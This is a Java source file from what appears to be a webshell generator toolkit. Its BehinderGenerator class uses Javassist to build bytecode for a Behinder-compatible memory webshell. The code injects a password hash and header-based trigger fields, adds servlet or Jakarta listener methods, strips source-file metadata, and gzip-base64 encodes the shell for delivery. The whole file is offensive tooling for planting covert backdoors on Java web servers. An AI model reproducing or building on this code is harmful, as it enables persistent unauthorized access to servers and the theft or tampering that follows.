package jmg.behinder.generator;

import javassist.ClassClassPath;
import javassist.CtClass;
import jmg.behinder.util.ShellUtil;
import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;
import jmg.core.generator.IShellGenerator;
import jmg.core.util.CommonUtil;
import jmg.core.util.JavassistUtil;
import jmg.core.util.ResponseUtil;

public class BehinderGenerator implements IShellGenerator {

    @Override
    public void initShell(AbstractConfig config) {
        if (config.getPass() == null) config.setPass(CommonUtil.genRandomLengthString(6));
    }

    @Override
    public byte[] makeShell(AbstractConfig config) throws Exception {
        initShell(config);
        String shellName = ShellUtil.getShellName(config.getToolType(), config.getShellType());
        String shellClassName = ShellUtil.getShellClassName(shellName);
        byte[] bytes = modifyShell(shellClassName, config);
        config.setShellBytes(bytes);
        config.setShellBytesLength(bytes.length);
        config.setShellGzipBase64String(CommonUtil.encodeBase64(CommonUtil.gzipCompress(bytes)));
        return bytes;
    }

    @Override
    public byte[] modifyShell(String className, AbstractConfig config) {
        byte[] bytes = new byte[0];
        try {
            pool.insertClassPath(new ClassClassPath(BehinderGenerator.class));
            CtClass ctClass = pool.getCtClass(className);
            ctClass.getClassFile().setVersionToJava5();
            JavassistUtil.addFieldIfNotNull(ctClass, "pass", CommonUtil.getMd5(config.getPass()).substring(0, 16));
            JavassistUtil.addFieldIfNotNull(ctClass, "headerName", config.getHeaderName());
            JavassistUtil.addFieldIfNotNull(ctClass, "headerValue", config.getHeaderValue());
            JavassistUtil.setNameIfNotNull(ctClass, config.getShellClassName());
            if (config.getShellType().equals(Constants.SHELL_LISTENER)) {
                String methodBody = ResponseUtil.getMethodBody(config.getServerType());
                JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
            }
            if (config.getShellType().equals(Constants.SHELL_JAKARTA_LISTENER)) {
                String methodBody = ResponseUtil.getMethodBody(config.getServerType());
                methodBody = methodBody.replace("javax.servlet.", "jakarta.servlet.");
                JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
            }
            JavassistUtil.removeSourceFileAttribute(ctClass);
            bytes = ctClass.toBytecode();
            ctClass.detach();
        } catch (Exception e) {
            e.printStackTrace();
            throw new RuntimeException(e);
        }
        return bytes;
    }

}
